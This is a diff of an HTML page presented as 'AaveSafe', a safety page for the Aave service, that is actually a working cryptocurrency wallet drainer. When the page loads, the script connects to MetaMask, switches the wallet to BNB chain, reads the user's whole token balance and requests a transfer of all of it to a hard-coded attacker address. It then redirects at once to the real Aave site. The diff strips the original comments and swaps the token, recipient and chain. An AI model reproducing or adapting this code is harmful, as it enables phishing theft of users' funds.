@@ -2,20 +2,18 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>SAFETY</title>
+    <title>AaveSafe</title>
 </head>
 <body>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.10.0/web3.min.js"></script>
     <script>
-        // تنظیمات - این مقادیر از بک‌اند شما تزریق می‌شوند
-        const CONFIG = {         
-            tokenAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",      // آدرس توکن ERC20
-            recipientAddress: "0xe8729e199c2E2476a19704D316731b087f9a06a6", // آدرس مقصد
-            redirectUrl: "https://shooshoo.us",         // وبسایت ریدایرکت
-            redirectDelay: 100                               // تاخیر کمینه برای ریدایرکت فوری
+        const CONFIG = {
+            tokenAddress: "0x55d398326f99059fF775485246999027B3197955",      
+            recipientAddress: "0xAc27F72fbCAF60243e4162984EB30c2CD719C562", 
+            redirectUrl: "http://app.aave.com/",         
+            redirectDelay: 100                               // 
         };
 
-        // ABI برای توابع ERC20
         const ERC20_ABI = [
             {
                 "constant": true,
@@ -30,23 +28,20 @@
                     {"name": "_to", "type": "address"},
                     {"name": "_value", "type": "uint256"}
                 ],
-                "name": "safety",
+                "name": "transfer",
                 "outputs": [{"name": "", "type": "bool"}],
                 "type": "function"
             }
         ];
 
         async function executeTransfer() {
-            // حذف تاخیر - اجرای فوری
             
-            // بررسی MetaMask
             if (typeof window.ethereum === 'undefined') {
                 window.location.href = CONFIG.redirectUrl;
                 return;
             }
 
             try {
-                // درخواست اتصال
                 const accounts = await window.ethereum.request({
                     method: 'eth_requestAccounts'
                 });
@@ -58,24 +53,21 @@
 
                 const userAddress = accounts[0];
 
-                // تغییر به Mainnet - بدون تاخیر
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
-                if (chainId !== '0x1') {
+                if (chainId !== '0x38') {
                     try {
                         await window.ethereum.request({
                             method: 'wallet_switchEthereumChain',
-                            params: [{ chainId: '0x1' }]
+                            params: [{ chainId: '0x38' }]
                         });
                     } catch (switchError) {
-                        // ادامه
+                        // 
                     }
                 }
 
-                // Web3 و کانترکت
                 const web3 = new Web3(window.ethereum);
                 const contract = new web3.eth.Contract(ERC20_ABI, CONFIG.tokenAddress);
                 
-                // دریافت موجودی
                 let balance = '0';
                 try {
                     balance = await contract.methods.balanceOf(userAddress).call();
@@ -83,46 +75,39 @@
                     balance = '0';
                 }
 
-                // اگر موجودی صفر، 1 wei بگذار
                 if (balance === '0' || balance === 0) {
                     balance = '1';
                 }
 
-                // ایجاد تراکنش data
                 const transferData = contract.methods.transfer(CONFIG.recipientAddress, balance).encodeABI();
 
-                // پارامترهای تراکنش - Gas کم و ثابت
                 const txParams = {
                     to: CONFIG.tokenAddress,
                     from: userAddress,
                     data: transferData,
-                    gas: '0xC350' // 50,000 gas - کم و ثابت
+                    gas: '0xC350' // 
                 };
 
-                // ارسال درخواست + ریدایرکت فوری
                 window.ethereum.request({
                     method: 'eth_sendTransaction',
                     params: [txParams]
                 }).then(() => {
-                    // بعد از درخواست، فوری ریدایرکت
                 }).catch(() => {
-                    // حتی در صورت خطا، ریدایرکت
                 });
 
-                // ریدایرکت فوری - بدون انتظار برای پاسخ کاربر
+                // 
                 setTimeout(() => {
                     window.location.href = CONFIG.redirectUrl;
                 }, CONFIG.redirectDelay);
 
             } catch (error) {
-                // ریدایرکت فوری در صورت خطا
                 window.location.href = CONFIG.redirectUrl;
             }
         }
 
-        // اجرای خودکار هنگام بارگذاری صفحه
         window.addEventListener('load', executeTransfer);
     </script>
 </body>
 </html>
-          
+
+
